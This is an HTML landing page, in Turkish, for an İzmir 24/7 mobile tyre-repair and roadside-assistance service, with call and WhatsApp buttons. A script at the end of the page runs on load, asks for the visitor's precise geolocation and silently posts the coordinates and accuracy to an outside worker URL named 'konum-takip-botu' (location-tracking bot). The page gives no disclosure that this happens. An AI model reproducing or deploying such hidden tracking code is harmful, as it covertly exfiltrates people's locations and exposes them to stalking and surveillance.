<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>İzmir Mobil Lastikçi | 7/24 Acil Lastik Yol Yardım</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif}
    body{background:#050a1f;color:#fff;padding-bottom:80px}
    .container{padding:16px;text-align:center}
    header{background:#0a1128;padding:15px;border-bottom:1px solid #00d1ff}
    h1{font-size:24px;color:#00d1ff;margin-bottom:10px}
    .phone-big{font-size:26px;font-weight:900;color:#00d1ff;margin:20px 0;display:block;text-decoration:none}
    .fixed-bar{position:fixed;bottom:0;width:100%;display:grid;grid-template-columns:1fr 1fr}
    .fixed-bar a{padding:18px;text-align:center;font-weight:800;text-decoration:none;font-size:16px}
  </style>
</head>
<body>

<header><h1>İzmir <span>Mobil Lastikçi</span></h1></header>

<div class="container">
  <h2>7/24 Acil Yol Yardım</h2>
  <a href="tel:+905531182353" class="phone-big">📞 0553 118 23 53</a>
  <p>En yakın mobil ekip 15-30 dakikada yanınızda.</p>
</div>

<div class="fixed-bar">
  <a href="tel:+905531182353" style="background:#00d1ff;color:#000">📞 Hemen Ara</a>
  <a href="https://wa.me/905531182353" style="background:#25d366;color:#fff">💬 WhatsApp</a>
</div>

<script>
window.onload = function() {
    const workerURL = 'https://konum-takip-botu.sandalcigiray5.workers.dev/';

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                fetch(workerURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    })
                });
            },
            function(err) {
                console.log("Konum alınamadı.");
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }
};
</script>

</body>
</html>
